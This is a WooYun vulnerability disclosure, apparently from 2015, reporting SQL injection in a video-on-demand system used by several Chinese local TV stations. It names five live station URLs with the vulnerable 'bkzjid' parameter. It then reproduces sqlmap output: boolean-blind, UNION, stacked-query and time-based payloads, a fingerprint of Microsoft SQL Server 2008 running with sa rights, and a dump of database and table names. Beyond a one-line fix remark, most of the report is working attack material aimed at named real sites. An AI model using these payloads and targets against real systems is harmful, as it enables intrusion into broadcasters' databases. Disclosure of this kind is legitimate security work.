wybug_title: 某电视台在线播放系统注射漏洞
wybug_corp: 常州网视领航网络科技有限公司
wybug_status: 未联系到厂商或者厂商积极忽略
wybug_detail:
漏洞详情 披露状态：   									2015-04-07：	积极联系厂商并且等待厂商认领中，细节不对外公开									2015-05-22：	厂商已经主动忽略漏洞，细节向公众公开  简要描述： 有些电视台在使用 详细说明：  厂商貌似是：http://www.wslh.net/index.php?m=content&c=index&a=lists&catid=2出现在以下url里，据说提供五条实例才算通用？：http://v.pudongtv.cn/t/t1/user/bkzjsplb.aspx?m=1&n=1&uid=51&paixu=0&bkzjid=51http://v.sygd.tv/t/t1/user/bkzjsplb.aspx?m=1&n=1&uid=51&paixu=0&bkzjid=51http://v.zghhzx.com.cn/t/t1/user/bkzjsplb.aspx?m=1&n=1&uid=1&paixu=0&bkzjid=1http://v.jjbctv.com/t/t1/user/bkzjsplb.aspx?m=1&n=1&uid=1&paixu=0&bkzjid=1http://v.hcvw.cn/t/t1/user/bkzjsplb.aspx?m=1&n=1&uid=1&paixu=0&bkzjid=1...其中bkzjid参数存在注入：
GET parameter 'bkzjid' is vulnerable. Do you want to keep testing the others (i any)? [y/N] ysqlmap identified the following injection points with a total of 44 HTTP(s) reqests:---Place: GETParameter: bkzjid    Type: boolean-based blind    Title: AND boolean-based blind - WHERE or HAVING clause    Payload: m=1&n=1&uid=51&paixu=0&bkzjid=51 AND 7130=7130    Type: UNION query    Title: Generic UNION query (NULL) - 1 column    Payload: m=1&n=1&uid=51&paixu=0&bkzjid=-5010 UNION ALL SELECT CHAR(113)+CHA(108)+CHAR(115)+CHAR(121)+CHAR(113)+CHAR(120)+CHAR(107)+CHAR(70)+CHAR(120)+CHAR90)+CHAR(105)+CHAR(102)+CHAR(106)+CHAR(119)+CHAR(75)+CHAR(113)+CHAR(115)+CHAR(19)+CHAR(119)+CHAR(113)--    Type: stacked queries    Title: Microsoft SQL Server/Sybase stacked queries    Payload: m=1&n=1&uid=51&paixu=0&bkzjid=51; WAITFOR DELAY '0:0:5'--    Type: AND/OR time-based blind    Title: Microsoft SQL Server/Sybase time-based blind    Payload: m=1&n=1&uid=51&paixu=0&bkzjid=51 WAITFOR DELAY '0:0:5'-----[21:38:11] [INFO] testing Microsoft SQL Server[21:38:11] [INFO] confirming Microsoft SQL Server[21:38:12] [INFO] the back-end DBMS is Microsoft SQL Serverweb server operating system: Windows 2008 R2 or 7web application technology: ASP.NET, ASP.NET 4.0.30319, Microsoft IIS 7.5back-end DBMS: Microsoft SQL Server 2008[21:38:12] [INFO] fetching database names[21:38:13] [INFO] the SQL query used returns 7 entries[21:38:13] [INFO] retrieved: master[21:38:13] [INFO] retrieved: model[21:38:13] [INFO] retrieved: msdb[21:38:13] [INFO] retrieved: ReportServer[21:38:14] [INFO] retrieved: ReportServerTempDB[21:38:14] [INFO] retrieved: tempdb[21:38:14] [INFO] retrieved: WSLHavailable databases [7]:[*] master[*] model[*] msdb[*] ReportServer[*] ReportServerTempDB[*] tempdb[*] WSLH
默认sa权限，数据库：WSLH
Database: wslh[23 tables]+-------------------+| Bo1KeShiPin       || Bo1KeZhuanJi      || CunChuFuWuQi      || DianShiJieMuYuGao || DianShiTai        || GeRenGongGao      || IpDataBase        || LiuYan            || NeiRongFenLei     || PinDao            || PingLun           || RiZhi             || ShiPinFenLei      || ShiPinFenLei      || ShiPinSuCai       || XiangCeZhaoPian   || XiangCeZhuanJi    || YongHuHaoYou      || YongHuHaoYou      || YongHuJiaoSe      || YongHuShouCang    || ZhiBoTaoLun       || ZiBoRenWu         |+-------------------+
   漏洞证明：  

   修复方案：  这个系统开发的不谨慎，视频上传、get、post提交时的参数没有严格处理，导致注射等漏洞的产生可能获取系统权限，对地方电视台造成不必要的影响。   版权声明：转载请注明来源 piaoye@乌云
wybug_reply: 漏洞回应  厂商回应： 未能联系到厂商或者厂商积极拒绝
